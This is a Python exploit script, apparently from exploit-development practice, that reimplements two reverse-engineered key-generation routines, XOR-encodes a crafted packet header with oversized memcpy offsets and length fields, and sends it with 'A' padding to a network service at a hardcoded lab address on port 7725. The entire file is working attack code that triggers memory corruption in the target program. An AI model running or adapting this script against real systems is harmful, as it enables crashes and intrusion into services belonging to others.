from socket import *
from struct import *
from time import sleep
import sys
import ctypes


#mov ebx, static_value+4
#mov esi, static_value
#mov eax, ebx
#ecx = 0x15A
#ebx = 0x4e35
#check eax==0
# if (eax!=0) mul eax, ebx -> Stores result in (Most significant bit) edx-- (Least significant bit) eax



#eax = ecx, ecx=eax intercambia
#mul eax*esi y  lo guarda en edx y eax
#eax = eax+old eax
#eax = esi and esi = eax
#mul eax*ebx and stores edx--eax
#edx = edx + esi (old eax)
#eax = eax+1
#edx += Carry Flag
#ebx = eax
#esi = edx
#static_value = ebx
#static_value+4 = esi
#eax = esi
#eax & 0x7fffffff


value = 0x00000000
value2 = 0x68527209


def generate_key():
    global value #set value as global
    global value2 #set value2 as global
    ebx = value #ebx = static value
    esi = value2 #esi = static value 2
    eax = ebx #eax = ebx
    ecx = 0x15A #ecx = 0x15A
    ebx = 0x4e35 #ebx = 0x4e35
    if (eax!=0): #test eax, eax; jz
        eax = eax*ebx #multiplies and stores result in EDX:EAX
        edx = (eax & 0xffffffff00000000) >> 0x20
        eax = (eax & 0xffffffff)
    temp_eax = eax # xchg eax, ecx
    temp_ecx = ecx
    eax = temp_ecx
    ecx = temp_eax
    eax = eax * esi #mul esi and stores in EDX:EAX
    edx = (eax & 0xffffffff00000000) >> 0x20
    eax = eax & 0xFFFFFFFF
    ecx_value = ctypes.c_uint32(ecx).value #force ecx to be only a DWORD (python doesn´t have a DWORD type)
    ecx = ecx_value 
    eax += ecx #add ecx to eax

    eax = ctypes.c_uint32(eax).value #forces eax to DWORD
    temp_esi = esi #xchange esi, eax
    temp_eax = eax
    esi = temp_eax
    eax = temp_esi
    eax = eax*ebx #mul ebx
    edx = (eax & 0xffffffff00000000) >> 0x20
    eax = eax & 0xffffffff

    edx = edx + esi #add edx, esi
    edx = ctypes.c_uint32(edx).value
    carry_flag = bin(eax)[2] #python (sucks) implementation of adc edx, 0
    eax += 1
    if (carry_flag != bin(eax)[2]):
        edx+=1
    ebx = eax #end function
    esi = edx
    value2 = ebx
    value = esi
    eax = esi
    
    eax = eax & 0x7fffffff
    if (len(hex(value))>10 or len(hex(value2))>10):
        print("No funciono: "+ hex(value) + " y " + hex(value2))
    
    eax = eax & 0x800000FF #after the function returns another and operation is done
    if (eax > 0x7fffffff): #check if value is signed or not
       eax = eax-1
       eax = eax | 0xffffff00
       eax += 1
       print("Negative")
    return eax
       
counter = 0
keys= []
while (counter < 0x100 ):
    keys.append(generate_key())
    counter += 1


initiator = 0x41414141
def generate_key_2():
    #init with AAAA
    global initiator
    eax = initiator
    ecx = 0x0B1
    edx = 0x0
    edx = eax % ecx
    eax = eax // ecx
    ecx = edx * 0x0AB
    eax = initiator
    ebx = 0x0B1
    edx = 0x0
    edx = eax % ebx
    eax = eax // ebx
    eax += eax
    ecx = ecx - eax
    if (ecx < 0):
        ecx = ecx & (2**32-1)
    ax = ecx & 0xffff
    
    ax = ax & 0x7fff
    initiator = ax
    ax = ax & 0x0ff
    return ax
    
    

generate_key_2()
iterator = 0
second_key = []
while (iterator < (0x100-4)):
    second_key.append(generate_key_2())
    iterator+=1       
        
def connect_data():
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(("192.168.94.10", 7725))
    return s


def send_data(buf):
    s.send(buf)
s = connect_data()


    
buf=b"\x00\x03\x7b\xa3"
send_data(buf)
##buf = b"A"*0x400
##send_data(buf)
buf = bytearray([0x41]*0x4)
buf += pack("<I", 0x10) #offset where first memcpy starts
buf += pack("<I", 0x0a953) #first check
buf += pack("<i", 0x00037ba3-0x10) #how much bytes will be copied
buf += pack("<I", 0x0f2882a4) #second offset
buf += pack("<i", 0x0) #second offset+4
buf += pack("<I", 0x0a958) #second check #plus 8
buf += pack("<I", 0x0C9) #check 0x0042FA57
buf += pack("<I", 0x00037ba3-0x10) #size readed
buf += b"A"*(0x100-len(buf))
new_buf=b""
iterator = 0
index = 0

#perform both xor encryption against buffer
for r,k in enumerate(keys):
    if (iterator<4):
        new_buf += pack("<B", buf[r] ^ k)
    else:
        
        first_xor = buf[r] ^ k
        second_xor = first_xor ^ second_key[index]
        new_buf += pack("<B", second_xor)
        index += 1
    iterator+=1

buf = new_buf + b"A"*(0x00037ba3-0x100) #only xored 100 bytes, the others go as they are

send_data(buf)



